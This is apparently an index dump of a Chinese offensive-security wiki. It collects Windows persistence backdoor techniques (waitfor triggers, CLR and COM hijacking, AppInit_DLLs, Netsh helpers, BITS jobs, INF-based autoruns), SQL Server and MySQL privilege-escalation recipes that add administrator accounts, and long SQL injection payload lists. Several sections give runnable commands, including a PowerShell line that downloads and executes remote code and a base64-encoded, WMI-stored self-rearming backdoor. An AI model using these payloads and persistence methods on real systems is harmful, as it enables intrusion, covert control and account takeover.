test$ /del 然后再双击导出的注册表文件，然后我们再看一下 net user和计算机管理-用户和组中都查看不到用户了，但是我们可以用net user test$查看用户信息 这个时候我们再用net user test$ /del是删除不掉这个用户的，只能通过注册表来删除。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:20:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/10.html":{"url":"安全技术/Windows后门/10.html","title":"waitfor","keywords":"","body":"waitfor 关于waitfor手册中是这么解释的： 在系统上发送或等待信号。waitfor可用于跨网络同步计算机。 waitfor的语法 waitfor [/s [/u [\\] [/p []]]] /si waitfor [/t ] 参数解释： /s 指定远程计算机的名称或IP地址，默认为本地计算机 /u [] 使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。 /p 指定/u参数中指定的用户帐户的密码。 /si 发送指定激活信号。 /t 指定等待信号的秒数。默认为无限期等待。 指定等待或发送的信号，不区分大小写，长度不能超过225个字符 关于waitfor更多的信息可以看一下微软提供的手册：链接 我们来测试一下看看 waitfor test && calc 表示接收信号成功后执行计算器 waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test 结果如下 但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。 这里就要借用一下三好师傅的powershell脚本 支持系统： Windows Server 2003 Windows Vista Windows XP Windows Server 2008 Windows 7 Windows Server 2003 with SP2 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2000 Windows Server 2012 Windows Server 2003 with SP1 Windows 8 Windows 10 其他Server系统未测试，理论上支持 利用思路 Daniel Bohannon‏ @danielhbohannon在twitter上分享了他的利用思路：将waitfor接收信号后的操作设置为从远程服务器下载powershell代码并执行 地址如下： https://twitter.com/danielhbohannon/status/872258924078092288 细节如下图 此外，他还提到了一个有趣的技巧：如果将powershell代码设置为延期执行，那么接收信号后，后台将不存在进程waitfor.exe 我验证了这个结论，方法如下： 开启等待模式： cmd： waitfor test1 && && powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1') 发送信号： cmd： waitfor /s 127.0.0.1 /si test1 https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1的内容如下： Start-Sleep -Seconds 10; start-process calc.exe; 当成功接收信号后，进程waitfor.exe退出 接着执行powershell脚本，等待10秒再启动calc.exe 这10秒内，只存在进程powershell.exe 也就是说，如果把等待时间设置更长，那么再这一段等待时间内不存在进程waitfor.exe，提醒防御者注意这个细节 poc细节 如果作为一个后门，那么上面的利用方法还不够成熟 因为触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用 需要再次开启一个等待模式，才能再次触发后门 当然，可以在每次后门触发后手动开启一个等待模式 但这不够智能，能否通过脚本实现自动开启等待模式，使其成为一个可持续触发的后门呢？ 为此，我写了以下POC 思路1： 在目标系统保存一个ps脚本1.ps1 1.ps1内容如下： start-process calc.exe cmd /c waitfor persist `&`& powershell -executionpolicy bypass -file c:\\test\\1.ps1 注： 转义字符&在powershell中要用`&表示 开启等待模式： cmd： waitfor persist1 && powershell -executionpolicy bypass -file c:\\test\\1.ps1 发送信号： cmd： waitfor /s 127.0.0.1 /si persist1 思路2： 不在目标系统保存文件 这里使用一个之前在《WMI backdoor》中介绍过的技巧，将payload保存在WMI类中，进行读取使用 存储payload： （管理员权限） $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Backdoor' $StaticClass.Put() $StaticClass.Properties.Add('Code' , \"cmd /c start calc.exe\") $StaticClass.Put() 读取payload： ([WmiClass] 'Win32_Backdoor').Properties['Code'].Value 以上操作如下图 执行payload： $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec 注： 通过Invoke-Expression执行命令也可以，使用iex是为了缩短长度 结合waitfor的参数格式，这里选择将代码编码为base64 对执行payload的代码进行base64编码，以下代码保存在code.txt： $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec 对其进行base64编码，代码如下： $code = Get-Content -Path code.txt $bytes = [System.Text.Encoding]::UNICODE.GetBytes($code); $encoded = [System.Convert]::ToBase64String($bytes) $encoded 获得base64加密代码如下： JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA== 以上操作如下图 测试base64加密代码： powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA== 成功执行代码，如下图 根据以上思路，POC如下： 后门代码： （管理员权限） $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Backdoor' $StaticClass.Put() $StaticClass.Properties.Add('Code' , \"cmd /c start calc.exe ```&```& waitfor persist ```&```& powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==\") $StaticClass.Put() 注： 存在两次转义字符 ``用来表示` 安装代码： $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec 激活命令： waitfor /s 127.0.0.1 /si persist 实际测试如下图 存在bug，导致powershell.exe无法正常退出，进程在后台残留 所以需要添加一段代码，用来结束进程powershell.exe 注： 根据逻辑关系，结束powershell.exe的代码要写在powershell -nop -W Hidden -E ...之前 最终，完整POC代码如下： 后门代码： （管理员权限） $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Backdoor' $StaticClass.Put()| Out-Null $StaticClass.Properties.Add('Code' , \"cmd /c start calc.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor persist ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==\") $StaticClass.Put() | Out-Null $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec | Out-Null 激活命令： waitfor /s 127.0.0.1 /si persist 完整演示如下图 该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:32:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/11.html":{"url":"安全技术/Windows后门/11.html","title":"CLR","keywords":"","body":"CLR CLR的简述（来自百度百科） CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引擎。 需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下 修改一下注册表，注册表路径：HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径 然后在cmd下设置一下： PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序 SETX COR_ENABLE_PROFILING= 1 /M SETX COR_PROFILER= {11111111-1111-1111-1111-111111111111} /M 然后执行一波，效果如下，可以看到已经成功劫持了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:47:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/12.html":{"url":"安全技术/Windows后门/12.html","title":"Hijack CAccPropServicesClass and MMDeviceEnumerator","keywords":"","body":"Hijack CAccPropServicesClass and MMDeviceEnumerator 什么是COM（来自WIKI） 组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。 这个和CRL劫持.NET程序类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。 经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法： 在%APPDATA%\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\下放入我们的后门dll，重命名为test._dl PS：如果Installer文件夹不存在，则依次创建Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E} 然后就是修改注册表了，在注册表位置为：HKCU\\Software\\Classes\\CLSID\\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\\Users\\qiyou\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment 然后就是测试了，打开iexplore.exe，成功弹框 PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:34:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/13.html":{"url":"安全技术/Windows后门/13.html","title":"劫持MruPidlList","keywords":"","body":"劫持MruPidlList 在注册表位置为HKCU\\Software\\Classes\\CLSID\\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment 该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件 当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个explorer.exe进程再起一个进程来看一下效果 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:35:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/14.html":{"url":"安全技术/Windows后门/14.html","title":"文件关联","keywords":"","body":"文件关联 什么是文件关联 文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。 举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。 PS：来自百度百科 我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联 我们可以用ftype命令显示或修改用在文件扩展名关联中的文件类型 相关注册表 HKEY_CURRENT_USER\\Software\\Classe //保存了当前用户的类注册和文件扩展名信息 HKEY_LOCAL_MACHINE\\Software\\Classe //保存了系统所有用户用户的类注册和文件扩展名信息 HKEY_CLASS_ROOT //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图 我们以.txt为例，通过文件关联来修改它默认打开的程序。 修改\\HKEY_CLASS_ROOT\\txtfile\\shell\\open\\command的默认值为我们要执行的程序 效果如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:37:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/15.html":{"url":"安全技术/Windows后门/15.html","title":"AppInit_DLLs","keywords":"","body":"AppInit_DLLs User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。 其注册表位置为：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1 效果如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:38:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/16.html":{"url":"安全技术/Windows后门/16.html","title":"Netsh helper","keywords":"","body":"Netsh helper netsh（全称：Network Shell） 是windows系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用netsh add helper yourdll.dll来添加拓展功能，添加了之后，在启动netsh的时候就会加载我们dll文件 添加自定义helper dll 关于helper dll的编写可以参考这个项目：链接 我们可以使用两种方式来添加helper： 通过cmd添加helper netsh add helper test.dll 通过注册表添加helper 其位置为：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh，创建一个键，名称随便，键值为我们dll的路径 效果如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:40:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/17.html":{"url":"安全技术/Windows后门/17.html","title":"利用BITS","keywords":"","body":"利用BITS BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。 bitsadmin是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行bitsadmin /?或bitsadmin /HELP获取帮助列表。 常见的bitsadmin命令 bitsadmin /create [type] DisplayName //创建一个任务 bitsadmin /cancel //删除一个任务 bitsadmin /list /allusers /verbose //列出所有任务 bitsadmin /AddFile //给任务test添加一个下载文件 bitsadmin /SetNotifyCmdLine [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。 bitsadmin /Resume //激活传输队列中的新任务或挂起的任务。 bitsadmin /cancel //删除某个任务 bitsadmin /reset /allusers //删除所有任务 bitsadmin /complete //完成某个任务 下面我们来测试一下： bitsadmin /create test bitsadmin /addfile test c:\\windows\\system32\\calc.exe c:\\Users\\qiyou\\Desktop\\calc.exe //为了方便起见我们直接复制本地文件 bitsadmin /SetNotifyCmdLine test cmd.exe \"cmd.exe /c calc.exe\" bitsadmin /resume test 效果如下： 重启电脑之后任务还是存在 重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行（由于时间太长了就不录制gif了） 如果我们想让任务完成，可以执行bitsadmin /complete test，calc.exe也会复制到桌面上 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:42:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/18.html":{"url":"安全技术/Windows后门/18.html","title":"利用inf文件实现后门","keywords":"","body":"利用inf文件实现后门 inf文件 INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。 PS：来自WIKI inf`文件的结构 想了解更多可以看一下微软的手册：`https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries 1. DefaultInstall节（来自WIKI） INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。 2. DefaultInstall节（来自微软的手册） RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。 RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。 RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。 RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。 下面举一个calc.inf弹计算器的例子 [Version] Signature=\"$CHICAGO$\" AdvancedINF=2.5,\"test\" [DefaultInstall] RunPreSetupCommands=Command1 [Command1] C:\\windows\\system32\\calc.exe 命令行下执行： rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall 效果如下： 后门实现： 在注册表HKEY_CURRENT_USER\\Software\\Microsoft\\处依次新建子项\\IEAK\\GroupPolicy\\PendingGPOs，然后再新建几个键，如下： 键：Count，类型：REG_DWORD，键值：1 键：Path1，类型：REG_SZ，键值：C:\\Users\\Administrator\\Desktop\\test\\calc.inf //这个为我们inf文件的路径，这里以上面那个inf文件例子为例 键：Section1，类型：REG_SZ，键值：DefaultInstall 如下图所示： 重启电脑之后成功弹出计算器 但是重启之后PendingGPOs该项就会被清除，需要我们重新修改注册表 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:44:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql提权手工辅助/1.html":{"url":"安全技术/sql/sql提权手工辅助/1.html","title":"UDF手工提权辅助","keywords":"","body":"UDF手工提权辅助： select @@basedir; #查看mysql安装目录 select 'It is dll' into dumpfile 'C:\\。。lib::'; #利用NTFS ADS创建lib目录 select 'It is dll' into dumpfile 'C:\\。。lib\\plugin::'; #利用NTFS ADS创建plugin目录 select 0xUDFcode into dumpfile 'C:\\phpstu\\MySQL\\lib\\plugin\\mstlab.dll'; #导出udfcode，注意修改udfcode create function cmdshell returns string soname 'mstlab.dll'; #用udf创建cmd函数，shell,sys_exec,sys_eval select shell('cmd','net user'); #执行cmd命令 show variables like '%plugin%'; #查看plugin路径 小技巧： 1.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MySQL 注册表中ImagePath的值为mysql安装目录 2.my.ini中datadir的值是数据存放目录 3.UPDATE user set File_priv ='Y'; flush privileges; 强制加file权限 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 01:39:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql提权手工辅助/2.html":{"url":"安全技术/sql/sql提权手工辅助/2.html","title":"MOF手工提权辅助","keywords":"","body":"MOF提权： #pragma namespace(\"\\\\.\\root\\subscription\") instance of __EventFilter as { EventNamespace = \"Root\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\") WSH.run(\\\"net.exe user admintony admin /add&&net.exe localgroup administrators admintony /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = ; Filter = ; }; 保存为 1.mof 然后mysql执行 select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-03 20:20:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql提权手工辅助/3.html":{"url":"安全技术/sql/sql提权手工辅助/3.html","title":"SA手工提权辅助","keywords":"","body":"SA提权： 1.判断扩展存储是否存在： select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell' select count(*) from master.dbo.sysobjects where name='xp_regread' 恢复： exec sp_dropextendedproc 'xp_cmdshell' exec sp_dropextendedproc xp_cmdshell,'xplog70.dll' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005) 2.列目录： exec master..xp_cmdshell 'ver' (or) exec master..xp_dirtree 'c:\\',1,1 (or) drop table black create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- insert into black exec master..xp_cmdshell 'dir c:\\' select top 1 mulu from black where id=1 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权 3.备份启动项： alter database [master] set RECOVERY FULL create table cmd (a image) backup log [master] to disk = 'c:\\cmd1' with init insert into cmd (a) values (0x(batcode)) backup log [master] to disk = 'C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\start.bat' drop table cmd 4.映像劫持 xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','reg_sz','c:\\windows\\system32\\cmd.exe' 5.沙盒模式提权： 方法a ```exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\u0004.0\\Engines','SandBoxMode','REG_DWORD',0; #关闭沙盒模式 方法b： Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\\windows\\system32\\ias\\ias.mdb','select shell(\"net user mstlab mstlab /add\")'); #or c:\\windows\\system32\\ias\\dnary.mdb string类型用此。 开启OpenRowSet：exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE; ### 6.xp_regwrite操作注册表 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows\\currentversion un','black','REG_SZ','net user test test /add' 开启xp_oacreate:exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE; ``` 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-03 20:23:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql注入payloads/通用SQL注入Payloads.html":{"url":"安全技术/sql/sql注入payloads/通用SQL注入Payloads.html","title":"通用SQL注入Payloads","keywords":"","body":"通用SQL注入Payloads ' '' ` `` , \" \"\" / // \\ \\\\ ; ' or \" -- or # ' OR '1 ' OR 1 -- - \" OR \"\" = \" \" OR 1 = 1 -- - ' OR '' = ' '=' 'LIKE' '=0--+ OR 1=1 ' OR 'x'='x ' AND id IS NULL; -- '''''''''''''UNION SELECT '2 %00 /*…*/ + addition, concatenate (or space in url) || (double pipe) concatenate % wildcard attribute indicator @variable local variable @@variable global variable # Numeric AND 1 AND 0 AND true AND false 1-false 1-true 1*56 -2 1' ORDER BY 1--+ 1' ORDER BY 2--+ 1' ORDER BY 3--+ 1' ORDER BY 1,2--+ 1' ORDER BY 1,2,3--+ 1' GROUP BY 1,2,--+ 1' GROUP BY 1,2,3--+ ' GROUP BY columnnames having 1=1 -- -1' UNION SELECT 1,2,3--+ ' UNION SELECT sum(columnname ) from tablename -- -1 UNION SELECT 1 INTO @,@ -1 UNION SELECT 1 INTO @,@,@ 1 AND (SELECT * FROM Users) = 1 ' AND MID(VERSION(),1,1) = '5'; ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- Finding the table name Time-Based: ,(select * from (select(sleep(10)))a) %2c(select%20*%20from%20(select(sleep(10)))a) ';WAITFOR DELAY '0:0:30'-- Comments: # Hash comment /* C-style comment -- - SQL comment ;%00 Nullbyte ` Backtick 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:20:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql注入payloads/常规 Error Based Payloads.html":{"url":"安全技术/sql/sql注入payloads/常规 Error Based Payloads.html","title":"常规 Error Based Payloads","keywords":"","body":"常规 Error Based Payloads OR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND ('pytW' LIKE 'pytW OR 3409=3409 AND ('pytW' LIKE 'pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND ('1427=1427 AND 7506=9091 AND ('5913=5913 AND 7300=7300 AND 'pKlZ'='pKlZ AND 7300=7300 AND 'pKlZ'='pKlY AND 7300=7300 AND ('pKlZ'='pKlZ AND 7300=7300 AND ('pKlZ'='pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- %' AND 8310=8310 AND '%'=' %' AND 8310=8311 AND '%'=' and (select substring(@@version,1,1))='X' and (select substring(@@version,1,1))='M' and (select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select substring(@@version,3,1))='c' and (select substring(@@version,3,1))='S' and (select substring(@@version,3,1))='X' 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:20:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql注入payloads/通用 Time Based SQL Injection Payloads.html":{"url":"安全技术/sql/sql注入payloads/通用 Time Based SQL Injection Payloads.html","title":"通用 Time Based SQL Injection Payloads","keywords":"","body":"通用 Time Based SQL Injection Payloads # from wapiti sleep(5)# 1 or sleep(5)# \" or sleep(5)# ' or sleep(5)# \" or sleep(5)=\" ' or sleep(5)=' 1) or sleep(5)# \") or sleep(5)=\" ') or sleep(5)=' 1)) or 